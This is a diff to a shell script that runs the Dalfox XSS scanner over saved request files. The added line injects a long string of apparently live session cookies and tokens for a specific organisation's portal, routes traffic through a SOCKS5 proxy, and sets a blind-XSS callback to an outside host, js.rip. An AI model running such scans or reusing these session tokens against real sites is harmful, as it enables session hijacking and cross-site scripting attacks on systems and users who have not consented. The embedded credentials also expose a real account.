@@ -34,7 +34,7 @@ for file in "$INPUT_DIR"/*.txt; do
     echo "Scanning $file with Dalfox..."
     
     # Run Dalfox with --only-poc to stop after the first detection
-    dalfox file --rawdata "$file" --only-poc 'r,v' --skip-mining-all > "$output_file"
+    dalfox file --rawdata "$file" --only-poc 'r,v' --skip-mining-all -C 'msr-selected-lang=he; LastMRH_Session=5154d50c; MRHSession=989506826addc328eb814c8d5154d50c; TS017420e1=018889141a3e1547183301eaeba31c04c8c85a84dbb150cb116968ac3c1f66f43a41b31e14735b9ff7c6376b61ae898e63a8ebc5f006cbab79debe5d430088f84ff2f9363ad73fd8c56c6c52479df9eb67754a5576f95ff091cd6858c5041ce754008ef499c9fc1f86204195d4fe92887953399f7fa7ea25ad81d748b19e31f5b51f3fcb97c80b541ed0fb5f479cb0a24c9ae003c7324d4ae6b0c59c72278e727f676b3e541e122b4c24d35f84f3ff19daada0b5d29fb229cbf4811e2d51392af303d7e26e; rsa-local=777777777Z00Z00; F5_ST=1z1z1z1745567058z108000; TS017420e1030=01da69304a8e13a53a7fb13b15456d9a1db8805cc5b9f4dca62603b2c269910097b2e15a4712476e2cc3f32b3ff185686abe2c6bda; tase-server-time=2025-04-24T10:44:55; .TASESSOTEST=fc43f6b0-d887-492d-8099-becd9b54d6d1; LastLoginName=777777777; __RequestVerificationToken_L01TUg2=iY0ZNJqPn1TftaOwq1uWZ-KQ53gqYqyKxsTu622sFsB2J7pFUH0iGW42qCqcIADjONrhQAjaQBkEiicDtBCjb6vEAMP4XNnd3pZwM7HHPCM1' --proxy socks5://127.0.0.1:5555 -b 'https://js.rip/1ie59yi7fz' > "$output_file"
 
     echo "Results saved to $output_file"
 done
